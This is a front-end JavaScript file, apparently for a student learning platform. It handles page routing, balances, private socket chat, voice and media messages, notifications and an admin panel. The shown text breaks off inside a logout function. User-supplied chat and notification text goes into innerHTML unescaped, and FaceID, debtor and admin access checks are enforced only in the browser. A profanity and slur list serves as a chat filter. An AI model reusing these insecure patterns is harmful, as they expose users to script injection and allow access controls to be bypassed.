    const socket = io();
    const pages = document.querySelectorAll('.page');
    const navLinks = document.querySelectorAll('nav a');
    const chatItems = document.querySelectorAll('.chat-item');
    const backBtn = document.querySelector('.back');
    const avatar = document.getElementById('avatar');
    const profileAvatar = document.getElementById('profile-avatar');
    const messagesDiv = document.getElementById('messages');
    const messageForm = document.getElementById('message-form');
    const messageInput = document.getElementById('message-input');
    const fileInput = document.getElementById('file-input');
    const sendButton = document.getElementById('send-button');
    const usernameDisplay = document.getElementById('username-display');
    const changeAvatarBtn = document.getElementById('change-avatar');
    const avatarInput = document.getElementById('avatar-input');
    const balanceAmount = document.getElementById('balance-amount');
    const balanceStatus = document.getElementById('balance-status');
    const loginBtn = document.getElementById('login-btn');
    const currentUser = sessionStorage.getItem('username') || 'Guest';
    let currentChatId = null;
	let accountStatus = null;
	let isCurrentSessionsPassedFaceID = '';
	
function fetchPoints(username) {
  const pointsValue = document.getElementById("points-value");
  const progressCard = document.getElementById("progress-card");

  if (!pointsValue || !progressCard) return;

  const mainPage = document.getElementById("main");
  if (!mainPage.classList.contains("active")) return;

  // Используем Intl для форматирования в компактном стиле
  const formatter = new Intl.NumberFormat('en', {
    notation: 'compact',
    compactDisplay: 'short',
    maximumFractionDigits: 1
  });

  const updatePointsValue = () => {
    const cachedPoints = sessionStorage.getItem('userPoints');
    if (cachedPoints) {
      pointsValue.innerText = formatter.format(parseInt(cachedPoints));
      return true;
    }

    fetch(`/api/get_balance/${username}`)
      .then(response => {
        if (!response.ok) throw new Error();
        return response.json();
      })
      .then(data => {
        const formatted = formatter.format(data.balance);
        pointsValue.innerText = formatted;
        sessionStorage.setItem('userPoints', data.balance);
      })
      .catch(() => {
        pointsValue.innerText = "0";
        sessionStorage.setItem('userPoints', "0");
      });

    return false;
  };

  if (progressCard.style.display !== "none") {
    updatePointsValue();
  } else {
    const observer = new MutationObserver((mutations) => {
      mutations.forEach(mutation => {
        if (mutation.attributeName === "style" && progressCard.style.display !== "none") {
          updatePointsValue();
          observer.disconnect();
        }
      });
    });
    observer.observe(progressCard, { attributes: true });
  }
}


const updateCoinsValue = () => {
  const username = sessionStorage.getItem("username");
  if (!username) return;

  fetch(`/api/get_user_coins/${username}`)
    .then(res => res.json())
    .then(data => {
      if (data && typeof data.coins === "number") {
        const coins = Math.floor(data.coins); // удаляет дробную часть
        document.getElementById("coins-value").textContent = coins.toLocaleString();
      } else {
        document.getElementById("coins-value").textContent = "--";
      }
    })
    .catch(() => {
      document.getElementById("coins-value").textContent = "--";
    });
};

    // Show username and avatar
    document.getElementById('username').textContent = currentUser;
    usernameDisplay.textContent = currentUser;
    fetch(`/get_avatar/${currentUser}`)
      .then(res => res.json())
      .then(data => {
        if (data.avatar_url) {
          avatar.src = data.avatar_url;
          profileAvatar.src = data.avatar_url;
          avatar.style.display = 'block';
          profileAvatar.style.display = 'block';
        }
      });

    // Show login button if Guest
if (currentUser === 'Guest') {
  loginBtn.style.display = 'block';


  const reminderInterval = setInterval(() => {
    if (currentUser === 'Guest') {
     showModalStatus("You are not authorized. Please log in to your account to continue.", "failed");
    } else {
      clearInterval(reminderInterval); // Прекратить, если вошёл
    }
  }, 3000); // каждые 60 секунд
}


    // Handle connection errors
    socket.on('connect_error', (err) => {
      const errorDiv = document.createElement('div');
      errorDiv.classList.add('error-message');
      errorDiv.textContent = `Connection failed: ${err.message}. Please try again.`;
      messagesDiv.appendChild(errorDiv);
    });

let currentPageId = null; // глобальная переменная для отслеживания текущей страницы

fetchSessions();

function showPage(id) {
  let [pageId, subPage] = id.split('/');

  // 🔹 Если открываем ту же страницу без подстраницы — просто выходим
  if (currentPageId === id) {
    console.log(`Страница ${id} уже открыта — пропускаем повторный рендер`);
    return;
  }
  currentPageId = id; // обновляем текущую страницу

  // Страницы, запрещённые для должников
  const blockedPages = ['chat-list', 'progress', 'shop', 'coins-page'];
  if (accountStatus === 'Debtor' && blockedPages.includes(pageId)) {
    showToastNotification(
      "It seems you don't have enough money to get access to this page.",
      'error'
    );
    return;
  }

  // Страницы, требующие прохождения FaceID
  const faceIDRequiredPages = ['admin-panel', 'today', 'chat-list', 'chat-ui', 'progress', 'shop', 'coins-page','points-page'];
  const hasPassedFaceID = String(isCurrentSessionsPassedFaceID).toLowerCase() === 'true';
  if (!hasPassedFaceID && faceIDRequiredPages.includes(pageId)) {
    showToastNotification(
      "You must pass FaceID verification to access this page.",
      'error'
    );
    return;
  }

  // Показываем нужную страницу
  pages.forEach(p => {
    const isTarget = p.id === pageId;
    p.classList.toggle('active', isTarget);
    p.style.display = isTarget ? 'block' : 'none';
  });

  // Активируем ссылку в навигации
  navLinks.forEach(a => {
    a.classList.toggle('active', a.dataset.page === pageId);
  });

  // Обновляем URL
  history.pushState(null, '', `/${pageId}` + (subPage ? `/${subPage}` : ''));
  console.log(`Переключение на страницу: ${pageId}` + (subPage ? `, subsection: ${subPage}` : ''));

  // Хуки на страницу
  switch (pageId) {
    case 'chat-ui':
      scrollToBottom();
      hideNavigation();
      break;

    case 'chat-list':
      showNavigation();
      break;

    case 'main':
      fetchStudentProgress();
      setTimeout(() => {
        fetchPoints(currentUser);
        fetchLeaderboardRank(currentUser);
        loadUserCoins(currentUser);
      }, 1000);
      break;

    case 'progress':
      fetchStudentProgress();
      break;

    case 'leaderboard':
      updateLeaderboardUI();
      break;

    case 'coins-page':
      fetchDebts();
      break;

    case 'shop':
      openShop(currentUser);
      break;

    case 'inventory':
      initializeInventory(currentUser);
      break;

    case 'today':
      updateDays();
      updateTaskCount();
      fetchInitialExamTime();
      renderTasksSection();
      break;

    case 'notifications':
      onNotificationsPageOpen();
      showNotifIndicator(false);
      break;

    case 'private-chatlist':
      currentPrivateUser = null;
      showNavigation();
      loadPrivateChatUsers();
      break;

    case 'chat-ui-private':
      hideNavigation();
      break;

    case 'settings':
      fetchSessions();
      break;

    case 'exams':
      examsPageActive();
      break;

    case 'upload':
      loadIdeas();
      break;

    case 'tasks':
      loadTasks();
      break;

    case 'personal-analyzing':
      loadPersonalSummary(currentUser, currentLevel, currentUnit);
      break;

    case 'squid-game':
      createVideoPlayer('static/horror/trailer-squid-game.mp4', 'video-player-squid');
      startCountdownSquidTimer("2025-08-31T00:00:00", "countdown-timer");  
      break;

    case 'liveLesson':
      openLiveLesson();
      break;
	case 'writing-top-list':
      showWritingTopList();
      break;
	case 'my-certificates':
      loadCertificates(currentLevel);
      break;
	case 'attendance-history':
      renderAttendanceHistory();
      break;
	case 'admin-panel':
      adminPanel();
      break;
	case 'redeem-code':
      RedeemManager.init();
      RedeemManager.fetchUserCodes();
      break;
  }
}

async function adminPanel() {
  const container = document.getElementById("admin-panel-container");
  const iframe = document.getElementById("admin-panel-frame");
  const messageBox = document.getElementById("admin-access-message");

  try {
    const res = await fetch(`/api/inventory/${currentUser}`);
    const data = await res.json();

    const hasAccess = data.some(item => item.id === 19);

    if (hasAccess) {
      messageBox.style.display = "none";

      if (!iframe.src || iframe.src === "about:blank") {
        iframe.src = "/admin-panel";
      }
      container.style.display = "block";
    } else {
      container.style.display = "none";
      messageBox.innerHTML = `<i class="fa fa-times-circle" style="color:#e74c3c; margin-right:6px;"></i> You don’t have access to the admin panel.<br><i class="fa fa-shopping-cart" style="color:#3498db; margin-right:6px;"></i> You can buy this power on <strong>Horizon Shop</strong> and use it!`;
      messageBox.style.display = "block";
    }
  } catch (err) {
    container.style.display = "none";
    messageBox.innerHTML = `<i class="fa fa-exclamation-triangle" style="color:#f39c12; margin-right:6px;"></i> Failed to load. Please try again later.`;
    messageBox.style.display = "block";
  }
}


let currentPrivateUser = null;

function scrollMessagesToBottom() {
  const chatBox = document.querySelector('.messages-private');
  if (chatBox) {
    chatBox.scrollTop = chatBox.scrollHeight;
  }
}

async function loadPrivateChatUsers() {
  const listContainer = document.getElementById('private-chat-list');
  listContainer.innerHTML = '';

  // Скелетоны
  for (let i = 0; i < 4; i++) {
    const skeleton = document.createElement('div');
    skeleton.className = 'chat-private-item skeleton';
    skeleton.innerHTML = `<i></i><div></div>`;
    listContainer.appendChild(skeleton);
  }

  try {
    const usersResponse = await fetch('/api/users');
    const users = await usersResponse.json();
    const allChatsResponse = await fetch('/chat/all');
    const allChats = await allChatsResponse.json();

    listContainer.innerHTML = '';

    const usernames = Object.keys(users).filter(u => u !== currentUser);
    if (usernames.length === 0) {
      listContainer.innerHTML = '<p>No users found.</p>';
      return;
    }

    usernames.sort((a, b) => {
      const roomA = getRoomId(currentUser, a);
      const roomB = getRoomId(currentUser, b);
      const messagesA = allChats[roomA] || [];
      const messagesB = allChats[roomB] || [];
      const lastA = messagesA[messagesA.length - 1] || null;
      const lastB = messagesB[messagesB.length - 1] || null;
      if (!lastA && !lastB) return 0;
      if (!lastA) return 1;
      if (!lastB) return -1;
      const timeA = new Date(lastA.timestamp).getTime();
      const timeB = new Date(lastB.timestamp).getTime();
      if (timeA !== timeB) return timeB - timeA;
      return (lastA.sender !== currentUser) ? -1 : 1;
    });

    for (const username of usernames) {
      const avatarResponse = await fetch(`/get_avatar/${username}`);
      const { avatar_url } = await avatarResponse.json();

      const roomId = getRoomId(currentUser, username);
      const messages = allChats[roomId] || [];
      const last = messages[messages.length - 1] || null;

      let preview = '<p>Start private chat</p>';
      if (last) {
        if (last.media_url) preview = '<p>[media]</p>';
        else if (last.message) {
          const msg = last.message.length > 40 ? last.message.slice(0, 40) + '...' : last.message;
          preview = `<p>${msg}</p>`;
        }
      }

      const unreadCount = messages.filter(
        m => m.receiver === currentUser && !m.read
      ).length;

      const item = document.createElement('div');
      item.className = 'chat-private-item';
      item.dataset.chat = username;

      const avatarHtml = avatar_url
        ? `<div class="avatar"><img src="${avatar_url}" alt="${username}'s avatar"></div>`
        : `<div class="avatar fallback">!</div>`;

      item.innerHTML = `
        ${avatarHtml}
        <div>
          <strong>${username}</strong>
          ${preview}
        </div>
        ${unreadCount > 0 ? `<span class="unread-badge">${unreadCount}</span>` : ''}
      `;

      item.onclick = () => openPrivateChat(username);
      listContainer.appendChild(item);
    }
  } catch (err) {
    listContainer.innerHTML = `<p>Error loading users: ${err}</p>`;
  }
}



// Генерация room_id в JS
function getRoomId(user1, user2) {
  return [user1, user2].sort().join('_');
}


// Открыть чат
function openPrivateChat(username) {
  currentPrivateUser = username;

  showPage('chat-ui-private');

  // Присоединение к сокет-комнате
  socket.emit('join_private', {
    sender: currentUser,
    receiver: username
  });

  // Загрузка чата
  loadPrivateMessages();
  scrollMessagesToBottom();

  // Устанавливаем сразу имя
  document.getElementById('private-chat-username').innerText = username;
  document.getElementById('private-chat-status').innerText = 'loading...';

  // Проверка последнего входа через /sessions
  fetch('/sessions')
    .then(res => res.json())
    .then(data => {
      const userSessions = data.sessions.filter(s => s.username === username);

      let lastSeenText = 'no activity yet';
      let isOnline = false;

      if (userSessions.length > 0) {
        // берём последнее время логина
        const lastLogin = userSessions
          .map(s => new Date(s.loginTime))
          .sort((a, b) => b - a)[0];

        // 🔥 если есть хотя бы одна активная сессия → онлайн
        isOnline = true;

        lastSeenText = isOnline
          ? '● online'
          : `last seen: ${lastLogin.toLocaleString()}`;
      }

      const statusEl = document.getElementById('private-chat-status');
      statusEl.innerText = lastSeenText;
      statusEl.className = isOnline ? 'online-status' : 'offline-status';
    })
    .catch(err => {
      console.error('❌ Error fetching session data:', err);
      document.getElementById('private-chat-status').innerText = 'status unavailable';
    });

  // убираем "непрочитанное" при открытии
  const chatItem = document.querySelector(`.chat-private-item[data-chat="${username}"]`);
  if (chatItem) {
    chatItem.classList.remove('unread');
  }
}







// Загрузка истории
// Обновленная функция loadPrivateMessages() — использует крупные glass-skeleton блоки
function loadPrivateMessages() {
  const chatBox = document.getElementById('private-messages');

  if (!chatBox) return;

// Telegram-style skeleton bubbles (имитация загрузки сообщений)
const skeletonHTML = `
  <div class="skeleton-message" aria-busy="true" aria-live="polite" aria-label="Loading messages">

    <!-- incoming -->
    <div style="display:flex; gap:8px; align-items:flex-start;">
      <div class="skeleton-avatar"></div>
      <div class="skeleton-bubble incoming">
        <div class="skeleton-line long"></div>
        <div class="skeleton-line medium"></div>
      </div>
    </div>

    <!-- outgoing -->
    <div style="display:flex; gap:8px; align-items:flex-start; justify-content:flex-end;">
      <div class="skeleton-bubble outgoing">
        <div class="skeleton-line medium"></div>
        <div class="skeleton-line short"></div>
      </div>
      <div class="skeleton-avatar"></div>
    </div>

    <!-- incoming -->
    <div style="display:flex; gap:8px; align-items:flex-start;">
      <div class="skeleton-avatar"></div>
      <div class="skeleton-bubble incoming">
        <div class="skeleton-line long"></div>
      </div>
    </div>

    <!-- outgoing -->
    <div style="display:flex; gap:8px; align-items:flex-start; justify-content:flex-end;">
      <div class="skeleton-bubble outgoing">
        <div class="skeleton-line medium"></div>
        <div class="skeleton-line long"></div>
      </div>
      <div class="skeleton-avatar"></div>
    </div>

    <!-- incoming -->
    <div style="display:flex; gap:8px; align-items:flex-start;">
      <div class="skeleton-avatar"></div>
      <div class="skeleton-bubble incoming">
        <div class="skeleton-line long"></div>
        <div class="skeleton-line short"></div>
      </div>
    </div>

  </div>
`;



  chatBox.innerHTML = skeletonHTML;
  // скроллим вниз, чтобы пользователь сразу видел индикатор
  chatBox.scrollTop = chatBox.scrollHeight;

  fetch(`/chat/${currentUser}/${currentPrivateUser}`)
    .then(res => {
      if (!res.ok) throw new Error(res.statusText || 'Network response was not ok');
      return res.json();
    })
    .then(messages => {
      chatBox.innerHTML = '';

      if (!Array.isArray(messages) || messages.length === 0) {
        chatBox.innerHTML = '<div class="message-private">No messages.</div>';
        scrollMessagesToBottom();
        return;
      }

      // используем вашу функцию для отображения реальных сообщений
      messages.forEach(addPrivateMessage);

      markMessagesAsRead();
      scrollMessagesToBottom();
    })
    .catch(err => {
      const msg = escapeHtml(err && err.message ? err.message : String(err));
      chatBox.innerHTML = `<div class="message-private" role="alert">Error ocured: ${msg}</div>`;
    });

  function escapeHtml(str) {
    return String(str).replace(/[&<>"']/g, function (s) {
      return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[s];
    });
  }
}

function markMessagesAsRead() {
  fetch(`/chat/read/${currentUser}/${currentPrivateUser}`, {
    method: 'POST'
  }).catch(console.error);
}



// Расширенный список запрещённых слов
const bannedWords = [
  "suka", "yban", "mol", "pidr", "blyat",
  "nahui", "eblan", "chmo", "gandon", "kurva",
  "fuck", "shit", "bitch", "asshole", "faggot",
  "metan", "gaz", "propan", "chuchi",
  "kesaman", "oldiraman", "o'ldiraman", "am", "ambosh"
];

// Хранение количества нарушений для каждого юзера
const violationCounts = {};

function sendPrivateTextMessage() {
  const input = document.getElementById('private-message-input');
  const message = input.value.trim();
  if (!message) return;

  let filteredMessage = message;
  let hasViolation = false;

  // Проверка на запрещённые слова (ищем как подстроку)
  bannedWords.forEach(word => {
    const regex = new RegExp(word, "gi"); // без \b — ищет внутри слов
    if (regex.test(filteredMessage)) {
      hasViolation = true;
      // Замена на звёзды той же длины
      filteredMessage = filteredMessage.replace(regex, match => {
        return `<span class="banned-word">${"*".repeat(match.length)}</span>`;
      });
    }
  });

  if (hasViolation) {
    violationCounts[currentUser] = (violationCounts[currentUser] || 0) + 1;

    if (violationCounts[currentUser] >= 2) {
      fetch(`/ban-user/${currentUser}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          duration_days: 0, // в днях
          reason: "Use of offensive language",
          offensive_item: message
        })
      })
      .then(res => res.json())
      .then(data => {
        showToastNotification(
          `<b>Temporary Block</b> <span>${currentUser}, you are banned for 5 minutes due to repeated violations.</span>`,
          'error',
          8000
        );
        setTimeout(() => {
          window.location.href = "/login";
        }, 1000);
      });
      return;
    }

    showToastNotification(
      `<b>Warning</b> <span>${currentUser}, using offensive words is not allowed. Next time you will be blocked!</span>`,
      'warning',
      6000
    );
  }

  // Формируем сообщение
  const msg = {
    sender: currentUser,
    receiver: currentPrivateUser,
    message: filteredMessage,
    timestamp: new Date().toISOString()
  };

  socket.emit('send_private_message', msg);
  input.value = '';
}





// Обработка Enter
document.getElementById('private-message-input').addEventListener('keydown', function (e) {
  if (e.key === 'Enter') {
    e.preventDefault();
    sendPrivateTextMessage();
  }
});

// Кнопка отправки
document.getElementById('private-send-button').onclick = sendPrivateTextMessage;


// Открываем input при клике на кнопку "скрепка"
document.getElementById('attach-file-btn').addEventListener('click', () => {
  document.getElementById('private-file-input').click();
});

// Отправка медиа
document.getElementById('private-file-input').onchange = function () {
  const file = this.files[0];
  if (!file) return;

  const formData = new FormData();
  formData.append('file', file);
  formData.append('sender', currentUser);
  formData.append('receiver', currentPrivateUser);

  fetch('/chat/send_media', {
    method: 'POST',
    body: formData
  })
    .then(res => res.json())
    .then(data => {
      if (data.media_url) {
        const msg = {
          sender: currentUser,
          receiver: currentPrivateUser,
          message: '',
          media_url: data.media_url,
          timestamp: new Date().toISOString()
        };
        socket.emit('send_private_message', msg);
      }
    })
    .catch(console.error);

  this.value = ''; // сброс input
};


const voiceBtn = document.getElementById('voice-message-button');
let mediaRecorder = null;
let audioChunks = [];
let recordingStart = 0;
let recordingTimerInterval = null;

function formatTime(ms) {
  const s = Math.floor(ms / 1000);
  const mm = Math.floor(s / 60).toString().padStart(2, '0');
  const ss = (s % 60).toString().padStart(2, '0');
  return `${mm}:${ss}`;
}

function startTimer() {
  recordingStart = Date.now();
  const timerEl = voiceBtn.querySelector('.voice-timer');
  recordingTimerInterval = setInterval(() => {
    const elapsed = Date.now() - recordingStart;
    timerEl.textContent = formatTime(elapsed);
  }, 250);
}

function stopTimer() {
  clearInterval(recordingTimerInterval);
  recordingTimerInterval = null;
}

function startRecording() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    showToastNotification('<b>Ошибка</b> Браузер не поддерживает запись аудио.', 'error', 4000);
    return;
  }

  navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
    // Запись в Ogg/Opus
    let options = { mimeType: 'audio/ogg; codecs=opus' };
    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
      // fallback на webm, если браузер не поддерживает ogg
      options = { mimeType: 'audio/webm; codecs=opus' };
    }

    mediaRecorder = new MediaRecorder(stream, options);
    audioChunks = [];
    recordingStart = Date.now();

    mediaRecorder.addEventListener('dataavailable', e => {
      if (e.data.size > 0) audioChunks.push(e.data);
    });

    mediaRecorder.addEventListener('stop', async () => {
      try { stream.getTracks().forEach(t => t.stop()); } catch (e) {}

      const durationMs = Date.now() - recordingStart;
      const blob = new Blob(audioChunks, { type: options.mimeType });

      // передаём blob + длительность
      await sendVoiceBlob(blob, durationMs);
    });

    mediaRecorder.start();

    // === UI: только красный таймер ===
    voiceBtn.classList.add('recording');
    voiceBtn.setAttribute('aria-pressed', 'true');
    voiceBtn.innerHTML = `<span class="voice-timer">00:00</span>`;
    startTimer();
  }).catch(err => {
    console.error('getUserMedia error', err);
    showToastNotification('<b>Ошибка</b> Доступ к микрофону запрещён.', 'error', 5000);
  });
}

function stopRecording() {
  if (mediaRecorder && mediaRecorder.state === 'recording') {
    mediaRecorder.stop();
    mediaRecorder = null;
  }

  // UI назад
  voiceBtn.classList.remove('recording');
  voiceBtn.setAttribute('aria-pressed', 'false');
  voiceBtn.innerHTML = `<i class="fas fa-microphone"></i><span class="voice-timer"></span>`;
  stopTimer();
}



voiceBtn.addEventListener('click', (e) => {
  // Тогл: если уже записываем — остановить, иначе начать
  if (mediaRecorder && mediaRecorder.state === 'recording') {
    stopRecording();
  } else {
    startRecording();
  }
});

// Отправка Blob на сервер и пересылка через сокет (та же логика, что и у отправки media)
async function sendVoiceBlob(blob) {
  const formData = new FormData();
  const filename = `voice_${currentUser || 'user'}_${Date.now()}.webm`;
  formData.append('file', blob, filename);
  formData.append('sender', currentUser);
  formData.append('receiver', currentPrivateUser);

  try {
    const res = await fetch('/chat/send_media', {
      method: 'POST',
      body: formData
    });

    const data = await res.json();

    if (data && data.media_url) {
      // сообщение формируется как у вас в других media-обработчиках
      const msg = {
        sender: currentUser,
        receiver: currentPrivateUser,
        message: '',
        media_url: data.media_url,
        timestamp: new Date().toISOString(),
        media_type: 'voice'
      };
      socket.emit('send_private_message', msg);
    } else {
      console.error('send_media response error', data);
      showToastNotification('<b>Ошибка</b> Не удалось отправить голосовое сообщение.', 'error', 4000);
    }
  } catch (err) {
    console.error('sendVoiceBlob error', err);
    showToastNotification('<b>Ошибка</b> Сбой сети при отправке голосового сообщения.', 'error', 4000);
  }
}


socket.emit('join_all_private_rooms', { username: currentUser });

socket.on('receive_private_message', msg => {
  scrollMessagesToBottom();
  const isCurrentChat =
    (msg.sender === currentPrivateUser && msg.receiver === currentUser) ||
    (msg.sender === currentUser && msg.receiver === currentPrivateUser);

  if (isCurrentChat) {
    addPrivateMessage(msg);

    // ⬅️ Если ты сейчас в этом чате — пометить как прочитанное
    if (msg.receiver === currentUser) {
      markMessagesAsRead();
    }
  } else {
    showChatNotification({ sender: msg.sender, message: msg.message });
    loadPrivateChatUsers();

    const chatItem = document.querySelector(`.chat-private-item[data-chat="${msg.sender}"]`);
    if (chatItem) {
      chatItem.classList.add('unread');
    }
  }
});


function showChatNotification({ sender, message }) {
  const container = document.getElementById('toast-container');

  const toast = document.createElement('div');
  toast.className = `toast info`;
  toast.style.setProperty('--hide-delay', `7s`);

  const icon = document.createElement('div');
  icon.className = 'toast-icon';
  icon.innerHTML = `<i class="fas fa-comments"></i>`;

  const msg = document.createElement('div');
  msg.className = 'toast-message';
  msg.innerHTML = `<b>${sender}</b>: ${message || '[media]'}`;

  const openBtn = document.createElement('div');
  openBtn.className = 'toast-action';
  openBtn.innerHTML = `Open Chat`;
  openBtn.onclick = () => {
    openPrivateChat(sender);
    toast.remove();
  };

  const closeBtn = document.createElement('div');
  closeBtn.className = 'toast-close';
  closeBtn.innerHTML = '&times;';
  closeBtn.onclick = () => toast.remove();

  toast.append(icon, msg, openBtn, closeBtn);
  container.appendChild(toast);

  requestAnimationFrame(() => toast.classList.add('active'));
  //setTimeout(() => toast.remove(), 7000);
}

// Добавить сообщение в DOM
function addPrivateMessage(msg) {
  const chatBox = document.getElementById('private-messages');
  const div = document.createElement('div');

  const isSentByMe = msg.sender === currentUser;

  div.className = 'message-private ' + (isSentByMe ? 'sent' : 'received');

  let readIcon = '';
  if (isSentByMe) {
    const isRead = msg.read === true;
    readIcon = `<span class="read-status ${isRead ? 'read' : 'unread'}">
      <i class="fas fa-check"></i>
    </span>`;
  }

  div.innerHTML = `
    <strong>${msg.sender}</strong> ${msg.message || ''}
    ${msg.media_url ? renderMedia(msg.media_url) : ''}
    <br><small>${new Date(msg.timestamp).toLocaleString()} ${readIcon}</small>
  `;

  chatBox.appendChild(div);
  scrollMessagesToBottom();
}



// Media cache
const mediaCache = new Map();

function renderMedia(url) {
  const ext = url.split('.').pop().toLowerCase();
  const wrapperId = `media-${Math.random().toString(36).substring(2, 9)}`;

  let typeLabel = '';
  let icon = '';

  if (['jpg', 'jpeg', 'png', 'gif'].includes(ext)) {
    typeLabel = 'Photo';
    icon = 'fa-image';
  } else if (['mp4', 'mov'].includes(ext)) {
    typeLabel = 'Video';
    icon = 'fa-video';
  } else if (['mp3'].includes(ext)) {
    typeLabel = 'Audio';
    icon = 'fa-music';
  } else if (['webm'].includes(ext)) {
    typeLabel = 'Voice';
    icon = 'fa-microphone';
  } else {
    typeLabel = 'File';
    icon = 'fa-file-alt';
  }

  return `
    <div id="${wrapperId}" class="media-wrapper-private">
      <button onclick="downloadAndShowMedia('${url}', '${ext}', '${wrapperId}')" class="media-download-btn">
        <i class="fas ${icon}"></i> Download ${typeLabel}
      </button>
      <div class="media-content" style="margin-top: 10px;"></div>
    </div>
  `;
}

function downloadAndShowMedia(url, ext, wrapperId) {
  const wrapper = document.getElementById(wrapperId);
  const mediaBox = wrapper.querySelector('.media-content');
  const btn = wrapper.querySelector('.media-download-btn');

  btn.disabled = true;
  btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Downloading...`;

  // Check cache
  if (mediaCache.has(url)) {
    renderFromBlobURL(mediaCache.get(url), ext, mediaBox, btn, wrapperId);
    return;
  }

  fetch(url)
    .then(res => res.blob())
    .then(blob => {
      const blobUrl = URL.createObjectURL(blob);
      mediaCache.set(url, blobUrl);
      renderFromBlobURL(blobUrl, ext, mediaBox, btn, wrapperId);
    })
    .catch(err => {
      btn.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Failed`;
      console.error('Download failed:', err);
    });
}

function renderFromBlobURL(blobUrl, ext, container, btn, wrapperId) {
  let html = '';

  if (['jpg', 'jpeg', 'png', 'gif'].includes(ext)) {
    html = `<img src="${blobUrl}" class="media-img-private">`;
    btn.remove();

  } else if (['mp4', 'mov'].includes(ext)) {
    html = `<video controls preload="metadata" class="media-video-private">
              <source src="${blobUrl}" type="video/${ext}">
            </video>`;
    btn.remove();

  } else if (['webm', 'ogg'].includes(ext)) {
    // === Телеграм-стиль голосового сообщения без duration ===
    html = `
      <div class="telegram-voice-wrapper-private">
        <button class="voice-play-btn-private"><i class="fas fa-play"></i></button>
        <div class="voice-progress-container-private">
          <div class="voice-progress-bar-private"></div>
          <div class="voice-progress-scrubber-private"></div>
        </div>
        <div class="voice-time-private">
          <span class="current-time">0:00</span>
        </div>
      </div>
      <audio id="voice-${wrapperId}" src="${blobUrl}"></audio>
    `;
    btn.remove();

  } else if (ext === 'mp3') {
    // кастомный плеер с duration
    html = `
      <div class="telegram-audio-player-private">
        <button class="play-pause-btn-private"><i class="fas fa-play"></i></button>
        <div class="progress-container-private">
          <div class="progress-bar-private"></div>
          <div class="progress-scrubber-private"></div>
        </div>
        <div class="time-display-private">
          <span class="current-time">0:00</span> / <span class="duration">0:00</span>
        </div>
        <button class="speed-btn-private">1x</button>
      </div>
      <audio id="audio-${wrapperId}" src="${blobUrl}"></audio>
    `;
    btn.remove();

  } else {
    html = `<a href="${blobUrl}" download class="media-file-link-private">
              <i class="fas fa-file-download"></i> Download file
            </a>`;
    btn.remove();
  }

  container.innerHTML = html;

  // === Логика для голосовых (webm, ogg) ===
  if (['webm', 'ogg'].includes(ext)) {
    const audio = document.getElementById(`voice-${wrapperId}`);
    const playBtn = container.querySelector('.voice-play-btn-private');
    const progressBar = container.querySelector('.voice-progress-bar-private');
    const scrubber = container.querySelector('.voice-progress-scrubber-private');
    const currentTimeDisplay = container.querySelector('.current-time');

    let isDragging = false;

    function formatTime(seconds) {
      const m = Math.floor(seconds / 60);
      const s = Math.floor(seconds % 60);
      return `${m}:${s < 10 ? '0' : ''}${s}`;
    }

    audio.addEventListener('timeupdate', () => {
      if (!isDragging) {
        const progress = (audio.currentTime / audio.duration) * 100;
        progressBar.style.width = `${progress}%`;
        scrubber.style.left = `${progress}%`;
        currentTimeDisplay.textContent = formatTime(audio.currentTime);
      }
    });

    playBtn.addEventListener('click', () => {
      if (audio.paused) {
        audio.play();
        playBtn.innerHTML = '<i class="fas fa-pause"></i>';
      } else {
        audio.pause();
        playBtn.innerHTML = '<i class="fas fa-play"></i>';
      }
    });

    // drag scrubber
    progressBar.parentElement.addEventListener('mousedown', (e) => {
      isDragging = true;
      updateScrubber(e);
    });

    document.addEventListener('mousemove', (e) => {
      if (isDragging) updateScrubber(e);
    });

    document.addEventListener('mouseup', () => {
      isDragging = false;
    });

    function updateScrubber(e) {
      const rect = progressBar.parentElement.getBoundingClientRect();
      let pos = (e.clientX - rect.left) / rect.width;
      pos = Math.max(0, Math.min(1, pos));
      const time = pos * audio.duration;
      audio.currentTime = time;
      progressBar.style.width = `${pos * 100}%`;
      scrubber.style.left = `${pos * 100}%`;
      currentTimeDisplay.textContent = formatTime(time);
    }
  }
}



socket.on('messages_read', ({ reader, sender }) => {
  if (sender !== currentUser) return;

  const icons = document.querySelectorAll('.message-private.sent .read-status');
  icons.forEach(el => {
    el.classList.remove('unread');
    el.classList.add('read');
  });
});





// === JS: открыть страницу Notifications и загрузить данные ===
const notifBtn   = document.getElementById('notifications-btn');
const notifList  = document.getElementById('notifications-list');
const toggleBtns = document.querySelectorAll('#notifications .notif-toggle button');
const username   = document.getElementById('username').textContent;

// Показываем страницу при клике на колокольчик
notifBtn.addEventListener('click', e => {
  e.preventDefault();
  showPage('notifications');
});

// При открытии страницы notifications грузим General
function onNotificationsPageOpen() {
  // Активируем кнопку General
  toggleBtns.forEach(b => b.classList.toggle('active', b.dataset.type === 'general'));
  loadNotifications('general');
}

// Обработчики переключателя внутри страницы
toggleBtns.forEach(btn => {
  btn.addEventListener('click', () => {
    toggleBtns.forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    loadNotifications(btn.dataset.type);
  });
});

// Функция загрузки уведомлений с заголовком
async function loadNotifications(type) {
  const url = type === 'important'
    ? `/api/notifications/important`
    : `/api/notifications/general/${username}`;

  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error();
    const data = await res.json();
    const list = data.notifications;

    notifList.innerHTML = (Array.isArray(list) && list.length)
      ? list.reverse().map(n => `
        <li class="notification-item ${type}">
          <div class="notification-icon">
            <i class="fas ${ type === 'important' ? 'fa-exclamation-circle' : 'fa-info-circle' }"></i>
          </div>
          <div class="notification-text">
            <div class="notification-title">${n.title || (type === 'important' ? 'Important Notice' : 'Notification')}</div>
            <div class="notification-message">${n.message}</div>
          </div>
        </li>
      `).join('')
      : `<li class="no-notifs">No ${type} notifications.</li>`;

  } catch (err) {
    console.error(err);
    showToastNotification('Ошибка при загрузке уведомлений', 'error');
  }
}


function showNotifIndicator(show) {
  const dot = document.getElementById('notif-indicator');
  if (dot) dot.style.display = show ? 'block' : 'none';
}

socket.on('new_notification', function(data) {
	showNotifIndicator(true);
    showToastNotification('<b>' + data.message + '</b>', 'info', 5000);
});

async function logout() {
  try {
